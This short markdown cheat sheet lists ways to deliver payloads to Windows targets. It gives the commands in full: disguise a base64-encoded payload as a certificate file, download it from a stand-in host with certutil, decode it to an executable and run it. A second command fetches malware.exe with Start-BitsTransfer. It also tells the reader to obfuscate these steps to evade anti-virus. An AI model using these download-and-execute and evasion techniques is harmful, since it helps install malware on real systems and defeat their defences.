# Ways to Deploy Payloads to OS Targets

## Windows

- Certutil:
  - Encode payload with base64
  - Name the payload something unassuming, such as ComodoRootCA.p12
  - Invoke CertUtil, similarly to `certutil.exe -urlcache -split -f hxxp://badplace.net/certs/ComodoRootCA.p12 ComodoRootCA.p12`
  - Use CertUtil to decode the payload: `certutil.exe -decode ComodoRootCA.p12 payload.exe`
  - Run the payload
  - Note that anti-virus tools are mostly wise to this, so you will need to obfuscate it carefully if this is the method you want to use
    - Example: my anti-virus decided that this file was infected, due to the command line examples above!
- `Start-BitsTransfer -Source hxxp://badplace.net/malware.exe -Destination C:\Users\Administrator\Run.exe`
  - Generally used for Windows updates